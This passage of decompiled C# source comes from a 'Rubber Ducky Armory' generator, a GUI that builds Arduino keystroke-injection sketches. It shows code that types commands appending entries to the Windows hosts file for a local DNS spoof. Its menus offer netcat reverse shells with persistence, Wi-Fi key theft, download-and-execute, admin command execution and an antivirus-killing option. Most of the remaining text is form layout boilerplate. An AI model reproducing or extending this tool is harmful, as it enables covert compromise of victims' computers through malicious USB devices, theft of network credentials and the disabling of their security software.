      this.writeLine("Keyboard.print(\"echo \");");
      this.writeLine("Keyboard.print(\"" + str2.ToString() + "\");");
      this.writeLine("Keyboard.print(\"      \");");
      this.writeLine("Keyboard.print(\"" + str1.ToString() + "\");");
      this.writeLine("Keyboard.print(\" >> C://Windows//System32//Drivers//etc//hosts\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      this.writeLine("Keyboard.print(\"exit\");");
      this.writeLine("typeKey(KEY_RETURN);");
      this.commandExecutionDelay();
      return (object) null;
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.GroupBox1 = new GroupBox();
      this.RadioButton2 = new RadioButton();
      this.RadioButton1 = new RadioButton();
      this.GroupBox2 = new GroupBox();
      this.GroupBox6 = new GroupBox();
      this.Label4 = new Label();
      this.TrackBar4 = new TrackBar();
      this.GroupBox5 = new GroupBox();
      this.Label3 = new Label();
      this.TrackBar3 = new TrackBar();
      this.GroupBox4 = new GroupBox();
      this.Label2 = new Label();
      this.TrackBar2 = new TrackBar();
      this.Timer1 = new Timer(this.components);
      this.GroupBox7 = new GroupBox();
      this.RadioButton12 = new RadioButton();
      this.RadioButton11 = new RadioButton();
      this.RadioButton9 = new RadioButton();
      this.RadioButton8 = new RadioButton();
      this.RadioButton10 = new RadioButton();
      this.RadioButton7 = new RadioButton();
      this.RadioButton6 = new RadioButton();
      this.RadioButton5 = new RadioButton();
      this.RadioButton4 = new RadioButton();
      this.RadioButton3 = new RadioButton();
      this.RadioButton13 = new RadioButton();
      this.RadioButton14 = new RadioButton();
      this.RadioButton15 = new RadioButton();
      this.GroupBox8 = new GroupBox();
      this.Button1 = new Button();
      this.Button2 = new Button();
      this.RadioButton17 = new RadioButton();
      this.RichTextBox1 = new RichTextBox();
      this.CheckBox1 = new CheckBox();
      this.GroupBox1.SuspendLayout();
      this.GroupBox2.SuspendLayout();
      this.GroupBox6.SuspendLayout();
      this.TrackBar4.BeginInit();
      this.GroupBox5.SuspendLayout();
      this.TrackBar3.BeginInit();
      this.GroupBox4.SuspendLayout();
      this.TrackBar2.BeginInit();
      this.GroupBox7.SuspendLayout();
      this.GroupBox8.SuspendLayout();
      this.SuspendLayout();
      this.GroupBox1.Controls.Add((Control) this.CheckBox1);
      this.GroupBox1.Controls.Add((Control) this.RadioButton2);
      this.GroupBox1.Controls.Add((Control) this.RadioButton1);
      this.GroupBox1.Location = new Point(12, 12);
      this.GroupBox1.Name = "GroupBox1";
      this.GroupBox1.Size = new Size(877, 91);
      this.GroupBox1.TabIndex = 1;
      this.GroupBox1.TabStop = false;
      this.GroupBox1.Text = "Pre Settings - Step 01";
      this.RadioButton2.AutoSize = true;
      this.RadioButton2.Location = new Point(314, 39);
      this.RadioButton2.Name = "RadioButton2";
      this.RadioButton2.Size = new Size(208, 21);
      this.RadioButton2.TabIndex = 0;
      this.RadioButton2.TabStop = true;
      this.RadioButton2.Text = "Dont Minimize Windows First";
      this.RadioButton2.UseVisualStyleBackColor = true;
      this.RadioButton1.AutoSize = true;
      this.RadioButton1.Location = new Point(90, 39);
      this.RadioButton1.Name = "RadioButton1";
      this.RadioButton1.Size = new Size(174, 21);
      this.RadioButton1.TabIndex = 0;
      this.RadioButton1.TabStop = true;
      this.RadioButton1.Text = "Minimize Windows First";
      this.RadioButton1.UseVisualStyleBackColor = true;
      this.GroupBox2.Controls.Add((Control) this.GroupBox6);
      this.GroupBox2.Controls.Add((Control) this.GroupBox5);
      this.GroupBox2.Controls.Add((Control) this.GroupBox4);
      this.GroupBox2.Location = new Point(12, 109);
      this.GroupBox2.Name = "GroupBox2";
      this.GroupBox2.Size = new Size(877, 325);
      this.GroupBox2.TabIndex = 2;
      this.GroupBox2.TabStop = false;
      this.GroupBox2.Text = "Delay Management - Step 02";
      this.GroupBox6.Controls.Add((Control) this.Label4);
      this.GroupBox6.Controls.Add((Control) this.TrackBar4);
      this.GroupBox6.Location = new Point(659, 36);
      this.GroupBox6.Name = "GroupBox6";
      this.GroupBox6.Size = new Size(211, 270);
      this.GroupBox6.TabIndex = 0;
      this.GroupBox6.TabStop = false;
      this.GroupBox6.Text = "Command Execution Delay";
      this.Label4.AutoSize = true;
      this.Label4.Location = new Point(82, 238);
      this.Label4.Name = "Label4";
      this.Label4.Size = new Size(51, 17);
      this.Label4.TabIndex = 3;
      this.Label4.Text = "Label1";
      this.TrackBar4.Location = new Point(85, 21);
      this.TrackBar4.Maximum = 10000;
      this.TrackBar4.Minimum = 50;
      this.TrackBar4.Name = "TrackBar4";
      this.TrackBar4.Orientation = Orientation.Vertical;
      this.TrackBar4.Size = new Size(56, 204);
      this.TrackBar4.TabIndex = 0;
      this.TrackBar4.Value = 50;
      this.GroupBox5.Controls.Add((Control) this.Label3);
      this.GroupBox5.Controls.Add((Control) this.TrackBar3);
      this.GroupBox5.Location = new Point(325, 36);
      this.GroupBox5.Name = "GroupBox5";
      this.GroupBox5.Size = new Size(211, 270);
      this.GroupBox5.TabIndex = 0;
      this.GroupBox5.TabStop = false;
      this.GroupBox5.Text = "Download Programme Delay";
      this.Label3.AutoSize = true;
      this.Label3.Location = new Point(80, 238);
      this.Label3.Name = "Label3";
      this.Label3.Size = new Size(51, 17);
      this.Label3.TabIndex = 3;
      this.Label3.Text = "Label1";
      this.TrackBar3.Location = new Point(83, 21);
      this.TrackBar3.Maximum = 10000;
      this.TrackBar3.Minimum = 50;
      this.TrackBar3.Name = "TrackBar3";
      this.TrackBar3.Orientation = Orientation.Vertical;
      this.TrackBar3.Size = new Size(56, 204);
      this.TrackBar3.TabIndex = 0;
      this.TrackBar3.Value = 50;
      this.GroupBox4.Controls.Add((Control) this.Label2);
      this.GroupBox4.Controls.Add((Control) this.TrackBar2);
      this.GroupBox4.Location = new Point(8, 36);
      this.GroupBox4.Name = "GroupBox4";
      this.GroupBox4.Size = new Size(211, 270);
      this.GroupBox4.TabIndex = 0;
      this.GroupBox4.TabStop = false;
      this.GroupBox4.Text = "Run Programme Delay";
      this.Label2.AutoSize = true;
      this.Label2.Location = new Point(79, 238);
      this.Label2.Name = "Label2";
      this.Label2.Size = new Size(51, 17);
      this.Label2.TabIndex = 3;
      this.Label2.Text = "Label1";
      this.TrackBar2.Location = new Point(82, 21);
      this.TrackBar2.Maximum = 10000;
      this.TrackBar2.Minimum = 50;
      this.TrackBar2.Name = "TrackBar2";
      this.TrackBar2.Orientation = Orientation.Vertical;
      this.TrackBar2.Size = new Size(56, 204);
      this.TrackBar2.TabIndex = 0;
      this.TrackBar2.Value = 50;
      this.GroupBox7.Controls.Add((Control) this.RadioButton17);
      this.GroupBox7.Controls.Add((Control) this.RadioButton15);
      this.GroupBox7.Controls.Add((Control) this.RadioButton14);
      this.GroupBox7.Controls.Add((Control) this.RadioButton13);
      this.GroupBox7.Controls.Add((Control) this.RadioButton12);
      this.GroupBox7.Controls.Add((Control) this.RadioButton11);
      this.GroupBox7.Controls.Add((Control) this.RadioButton9);
      this.GroupBox7.Controls.Add((Control) this.RadioButton8);
      this.GroupBox7.Controls.Add((Control) this.RadioButton10);
      this.GroupBox7.Controls.Add((Control) this.RadioButton7);
      this.GroupBox7.Controls.Add((Control) this.RadioButton6);
      this.GroupBox7.Controls.Add((Control) this.RadioButton5);
      this.GroupBox7.Controls.Add((Control) this.RadioButton4);
      this.GroupBox7.Controls.Add((Control) this.RadioButton3);
      this.GroupBox7.Location = new Point(12, 440);
      this.GroupBox7.Name = "GroupBox7";
      this.GroupBox7.Size = new Size(877, 277);
      this.GroupBox7.TabIndex = 3;
      this.GroupBox7.TabStop = false;
      this.GroupBox7.Text = "Select Payload - Step 03";
      this.RadioButton12.AutoSize = true;
      this.RadioButton12.Location = new Point(399, 146);
      this.RadioButton12.Name = "RadioButton12";
      this.RadioButton12.Size = new Size(314, 21);
      this.RadioButton12.TabIndex = 0;
      this.RadioButton12.TabStop = true;
      this.RadioButton12.Text = "Netcat Reverse Powershell without Persistent";
      this.RadioButton12.UseVisualStyleBackColor = true;
      this.RadioButton11.AutoSize = true;
      this.RadioButton11.Location = new Point(399, 119);
      this.RadioButton11.Name = "RadioButton11";
      this.RadioButton11.Size = new Size(294, 21);
      this.RadioButton11.TabIndex = 0;
      this.RadioButton11.TabStop = true;
      this.RadioButton11.Text = "Netcat Reverse Powershell with Persistent";
      this.RadioButton11.UseVisualStyleBackColor = true;
      this.RadioButton9.AutoSize = true;
      this.RadioButton9.Location = new Point(399, 92);
      this.RadioButton9.Name = "RadioButton9";
      this.RadioButton9.Size = new Size(271, 21);
      this.RadioButton9.TabIndex = 0;
      this.RadioButton9.TabStop = true;
      this.RadioButton9.Text = "Netcat Reverseshell without Persistent";
      this.RadioButton9.UseVisualStyleBackColor = true;
      this.RadioButton8.AutoSize = true;
      this.RadioButton8.Location = new Point(399, 65);
      this.RadioButton8.Name = "RadioButton8";
      this.RadioButton8.Size = new Size(251, 21);
      this.RadioButton8.TabIndex = 0;
      this.RadioButton8.TabStop = true;
      this.RadioButton8.Text = "Netcat Reverseshell with Persistent";
      this.RadioButton8.UseVisualStyleBackColor = true;
      this.RadioButton10.AutoSize = true;
      this.RadioButton10.Location = new Point(399, 38);
      this.RadioButton10.Name = "RadioButton10";
      this.RadioButton10.Size = new Size(123, 21);
      this.RadioButton10.TabIndex = 0;
      this.RadioButton10.TabStop = true;
      this.RadioButton10.Text = "Grab Wifi Keys";
      this.RadioButton10.UseVisualStyleBackColor = true;
      this.RadioButton7.AutoSize = true;
      this.RadioButton7.Location = new Point(6, 146);
      this.RadioButton7.Name = "RadioButton7";
      this.RadioButton7.Size = new Size(311, 21);
      this.RadioButton7.TabIndex = 0;
      this.RadioButton7.TabStop = true;
      this.RadioButton7.Text = "Execute Commands on CMD as Current User";
      this.RadioButton7.UseVisualStyleBackColor = true;
      this.RadioButton6.AutoSize = true;
      this.RadioButton6.Location = new Point(6, 119);
      this.RadioButton6.Name = "RadioButton6";
      this.RadioButton6.Size = new Size(269, 21);
      this.RadioButton6.TabIndex = 0;
      this.RadioButton6.TabStop = true;
      this.RadioButton6.Text = "Execute Commands on CMD as Admin";
      this.RadioButton6.UseVisualStyleBackColor = true;
      this.RadioButton5.AutoSize = true;
      this.RadioButton5.Location = new Point(6, 92);
      this.RadioButton5.Name = "RadioButton5";
      this.RadioButton5.Size = new Size(349, 21);
      this.RadioButton5.TabIndex = 0;
      this.RadioButton5.TabStop = true;
      this.RadioButton5.Text = "Execute Commands on Powershell as Current User";
      this.RadioButton5.UseVisualStyleBackColor = true;
      this.RadioButton4.AutoSize = true;
      this.RadioButton4.Location = new Point(6, 65);
      this.RadioButton4.Name = "RadioButton4";
      this.RadioButton4.Size = new Size(307, 21);
      this.RadioButton4.TabIndex = 0;
      this.RadioButton4.TabStop = true;
      this.RadioButton4.Text = "Execute Commands on Powershell as Admin";
      this.RadioButton4.UseVisualStyleBackColor = true;
      this.RadioButton3.AutoSize = true;
      this.RadioButton3.Location = new Point(8, 38);
      this.RadioButton3.Name = "RadioButton3";
      this.RadioButton3.Size = new Size(256, 21);
      this.RadioButton3.TabIndex = 0;
      this.RadioButton3.TabStop = true;
      this.RadioButton3.Text = "Execute Commands on Run Window";
      this.RadioButton3.UseVisualStyleBackColor = true;
      this.RadioButton13.AutoSize = true;
      this.RadioButton13.Location = new Point(399, 173);
      this.RadioButton13.Name = "RadioButton13";
      this.RadioButton13.Size = new Size(137, 21);
      this.RadioButton13.TabIndex = 0;
      this.RadioButton13.TabStop = true;
      this.RadioButton13.Text = "Local DNS Spoof";
      this.RadioButton13.UseVisualStyleBackColor = true;
      this.RadioButton14.AutoSize = true;
      this.RadioButton14.Location = new Point(6, 173);
      this.RadioButton14.Name = "RadioButton14";
      this.RadioButton14.Size = new Size(151, 21);
      this.RadioButton14.TabIndex = 0;
      this.RadioButton14.TabStop = true;
      this.RadioButton14.Text = "Fake Update Prank";
      this.RadioButton14.UseVisualStyleBackColor = true;
      this.RadioButton15.AutoSize = true;
      this.RadioButton15.Location = new Point(6, 200);
      this.RadioButton15.Name = "RadioButton15";
      this.RadioButton15.Size = new Size(158, 21);
      this.RadioButton15.TabIndex = 0;
      this.RadioButton15.TabStop = true;
      this.RadioButton15.Text = "Wifi Hotspot Enabler";
      this.RadioButton15.UseVisualStyleBackColor = true;
      this.GroupBox8.Controls.Add((Control) this.Button2);
      this.GroupBox8.Controls.Add((Control) this.Button1);
      this.GroupBox8.Location = new Point(18, 723);
      this.GroupBox8.Name = "GroupBox8";
      this.GroupBox8.Size = new Size(864, 100);
      this.GroupBox8.TabIndex = 4;
      this.GroupBox8.TabStop = false;
      this.GroupBox8.Text = "Final Step - Upload Directly or Save";
      this.Button1.Location = new Point(219, 33);
      this.Button1.Name = "Button1";
      this.Button1.Size = new Size(176, 44);
      this.Button1.TabIndex = 0;
      this.Button1.Text = "Save Sketch";
      this.Button1.UseVisualStyleBackColor = true;
      this.Button2.Location = new Point(459, 33);
      this.Button2.Name = "Button2";
      this.Button2.Size = new Size(176, 44);
      this.Button2.TabIndex = 0;
      this.Button2.Text = "Upload - Coming Soon";
      this.Button2.UseVisualStyleBackColor = true;
      this.RadioButton17.AutoSize = true;
      this.RadioButton17.Location = new Point(399, 200);
      this.RadioButton17.Name = "RadioButton17";
      this.RadioButton17.Size = new Size(173, 21);
      this.RadioButton17.TabIndex = 0;
      this.RadioButton17.TabStop = true;
      this.RadioButton17.Text = "Download and Execute";
      this.RadioButton17.UseVisualStyleBackColor = true;
      this.RichTextBox1.Location = new Point(924, 18);
      this.RichTextBox1.Name = "RichTextBox1";
      this.RichTextBox1.Size = new Size(907, 683);
      this.RichTextBox1.TabIndex = 5;
      this.RichTextBox1.Text = "";
      this.CheckBox1.AutoSize = true;
      this.CheckBox1.Location = new Point(585, 40);
      this.CheckBox1.Name = "CheckBox1";
      this.CheckBox1.Size = new Size(170, 21);
      this.CheckBox1.TabIndex = 1;
      this.CheckBox1.Text = "Kill Possible Anti-Virus";
      this.CheckBox1.UseVisualStyleBackColor = true;
      this.AutoScaleDimensions = new SizeF(8f, 16f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(899, 835);
      this.Controls.Add((Control) this.RichTextBox1);
      this.Controls.Add((Control) this.GroupBox8);
      this.Controls.Add((Control) this.GroupBox7);
      this.Controls.Add((Control) this.GroupBox2);
      this.Controls.Add((Control) this.GroupBox1);
      this.Name = nameof (Form1);
      this.Text = "Rubber Ducky Armory By Chamod Priyamal";
      this.GroupBox1.ResumeLayout(false);
      this.GroupBox1.PerformLayout();
      this.GroupBox2.ResumeLayout(false);
      this.GroupBox6.ResumeLayout(false);
      this.GroupBox6.PerformLayout();
      this.TrackBar4.EndInit();
      this.GroupBox5.ResumeLayout(false);
      this.GroupBox5.PerformLayout();
      this.TrackBar3.EndInit();
      this.GroupBox4.ResumeLayout(false);
      this.GroupBox4.PerformLayout();
      this.TrackBar2.EndInit();
      this.GroupBox7.ResumeLayout(false);
      this.GroupBox7.PerformLayout();
      this.GroupBox8.ResumeLayout(false);
      this.ResumeLayout(false);
    }

    internal virtual GroupBox GroupBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual GroupBox GroupBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual GroupBox GroupBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual GroupBox GroupBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual GroupBox GroupBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Label Label4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual TrackBar TrackBar4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Label Label3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual TrackBar TrackBar3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual TrackBar TrackBar2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Timer Timer1
    {
      get
      {
        return this._Timer1;
      }
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        Timer timer1_1 = this._Timer1;
        if (timer1_1 != null)
          timer1_1.Tick -= eventHandler;
        this._Timer1 = value;
        Timer timer1_2 = this._Timer1;
        if (timer1_2 == null)
          return;
        timer1_2.Tick += eventHandler;
      }
    }

    internal virtual RadioButton RadioButton2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual RadioButton RadioButton1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual GroupBox GroupBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual RadioButton RadioButton12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual RadioButton RadioButton11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual RadioButton RadioButton9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual RadioButton RadioButton8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual RadioButton RadioButton10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual RadioButton RadioButton7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual RadioButton RadioButton6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual RadioButton RadioButton5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual RadioButton RadioButton4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual RadioButton RadioButton3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual RadioButton RadioButton15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual RadioButton RadioButton14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual RadioButton RadioButton13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual GroupBox GroupBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button Button2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button Button1
    {
      get
      {
        return this._Button1;
      }
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click);
        Button button1_1 = this._Button1;
        if (button1_1 != null)
          button1_1.Click -= eventHandler;
        this._Button1 = value;
        Button button1_2 = this._Button1;
        if (button1_2 == null)
          return;
        button1_2.Click += eventHandler;
      }
    }

    internal virtual RadioButton RadioButton17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual RichTextBox RichTextBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual CheckBox CheckBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }
  }
}
